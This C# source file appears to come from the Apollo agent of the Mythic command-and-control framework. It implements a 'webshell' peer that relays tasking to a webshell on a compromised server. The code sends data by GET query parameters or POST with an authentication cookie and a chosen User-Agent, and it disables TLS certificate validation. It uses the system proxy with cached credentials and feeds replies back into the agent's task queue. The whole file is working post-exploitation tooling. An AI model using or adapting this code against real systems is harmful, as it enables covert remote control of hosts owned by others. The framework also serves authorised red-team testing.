using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.IO.Pipes;
using System.Linq;
using System.Text;
using AI = ApolloInterop;
using AS = ApolloInterop.Structs.ApolloStructs;
using TTasks = System.Threading.Tasks;
using ApolloInterop.Classes.Core;
using ApolloInterop.Structs.ApolloStructs;
using Tasks;
using ApolloInterop.Utils;
using System.Net;
using System.IO;
using System.Security.Policy;
using ApolloInterop.Types.Delegates;

namespace Apollo.Peers.Webshell
{
    public class WebshellPeer : AI.Classes.P2P.Peer
    {
        private Action _sendAction;
        private TTasks.Task _sendTask;
        private string _remote_url;
        private string _remote_query_param;
        private string _remote_cookie_name;
        private string _remote_cookie_value;
        private string _remote_agent_id;
        private string _remote_user_agent;

        public WebshellPeer(IAgent agent, PeerInformation info) : base(agent, info)
        {
            C2ProfileName = "webshell";
            _remote_agent_id = info.CallbackUUID;
            _remote_url = info.C2Profile.Parameters.WebshellURL;
            _remote_query_param = info.C2Profile.Parameters.WebshellQueryParam;
            _remote_cookie_name = info.C2Profile.Parameters.WebshellCookieName;
            _remote_cookie_value = info.C2Profile.Parameters.WebshellCookieValue;
            _remote_user_agent = info.C2Profile.Parameters.WebshellUserAgent;
            _sendAction = () =>
            {
                _mythicUUID = info.CallbackUUID;
                OnUUIDNegotiated(this, new UUIDEventArgs(info.CallbackUUID));
                // Disable certificate validation on web requests
                ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072 | SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
                while (!_cts.IsCancellationRequested)
                {
                    _senderEvent.WaitOne();
                    if (!_cts.IsCancellationRequested && _senderQueue.TryDequeue(out byte[] result))
                    {
                        AS.IPCChunkedData chunkedData = _serializer.Deserialize<AS.IPCChunkedData>(Encoding.UTF8.GetString(result));
                        if (chunkedData.Data.Length == 0)
                        {
                            continue;
                        }
                        string data = Encoding.UTF8.GetString(Convert.FromBase64String(chunkedData.Data));
                        //DebugHelp.DebugWriteLine($"Got data to send: {data}, _sendAction in WebshellPeer, to {_mythicUUID} from {_uuid}");
                        Send(data);
                    }
                }
            };
        }

        private void Send(string data)
        {
            WebClient webClient = new WebClient();
            // Use Default Proxy and Cached Credentials for Internet Access
            webClient.Proxy = WebRequest.GetSystemWebProxy();
            webClient.Proxy.Credentials = CredentialCache.DefaultCredentials;
            webClient.Headers.Add("User-Agent", _remote_user_agent);
            //webClient.BaseAddress = _remote_url;
            webClient.Headers.Add(HttpRequestHeader.Cookie, $"{_remote_cookie_name}={_remote_cookie_value}");
            if (data.Length > 4000)
            {
                // do a POST
                try
                {
                    //DebugHelp.DebugWriteLine($"Sending POST to {_remote_url}");
                    var response = webClient.UploadString(_remote_url, data);
                    Recv(response, "");
                }
                catch (Exception ex)
                {
                    Recv("", ex.Message);
                }
            } else
            {
                // do a GET
                string QueryURL = _remote_url;
                if (QueryURL.Contains("?"))
                {
                    QueryURL += "&" + _remote_query_param + "=" + Uri.EscapeDataString(data);
                } else
                {
                    QueryURL += "?" + _remote_query_param + "=" + Uri.EscapeDataString(data);
                }
                try
                {
                    //DebugHelp.DebugWriteLine($"Sending GET to {QueryURL}");
                    using (var stream = webClient.OpenRead(QueryURL))
                    {
                        using (var streamReader = new StreamReader(stream))
                        {
                            var result = streamReader.ReadToEnd();
                            Recv(result, "");
                        }
                    }
                }
                catch(Exception ex)
                {
                    Recv("", ex.Message);
                }
            }

        }
        private void Recv(string data, string error_message)
        {
            //DebugHelp.DebugWriteLine($"got response: {data} - {error_message}");
            if (error_message.Length > 0)
            {
                return;
            }
            if (data.StartsWith("<span id=\"task_response\">"))
            {
                string response = data.Replace("<span id=\"task_response\">", "").Replace("</span>", "");
                if (response.Length == 0)
                {
                    return;
                }
                byte[] raw = Convert.FromBase64String(response);
                byte[] mythic_uuid_bytes = Encoding.UTF8.GetBytes(_mythicUUID);
                byte[] final_bytes = new byte[raw.Length + mythic_uuid_bytes.Length];
                Array.Copy(mythic_uuid_bytes, final_bytes, mythic_uuid_bytes.Length);
                Array.Copy(raw, 0, final_bytes, mythic_uuid_bytes.Length, raw.Length);
                string final_response = Convert.ToBase64String(final_bytes);
                //DebugHelp.DebugWriteLine($"got final response: {final_response}");
                _agent.GetTaskManager().AddDelegateMessageToQueue(new DelegateMessage()
                {
                    MythicUUID = _mythicUUID,
                    UUID = _uuid,
                    C2Profile = C2ProfileName,
                    Message = final_response
                });
            }
        }

        public override bool Connected()
        {
            //DebugHelp.DebugWriteLine($"checking if Connected()");
            return true;
        }

        public override bool Finished()
        {
            //DebugHelp.DebugWriteLine($"checking if Finished()");
            return false;
        }

        public override bool Start()
        {
            //DebugHelp.DebugWriteLine($"Start()");
            _sendTask = new TTasks.Task(_sendAction);
            _sendTask.Start();
            return true;
        }

        public override void Stop()
        {
            //DebugHelp.DebugWriteLine($"Stop()");
            _cts.Cancel();
            _senderEvent.Set();
            _sendTask.Wait();
            OnDisconnect(this, new EventArgs());
        }
    }
}
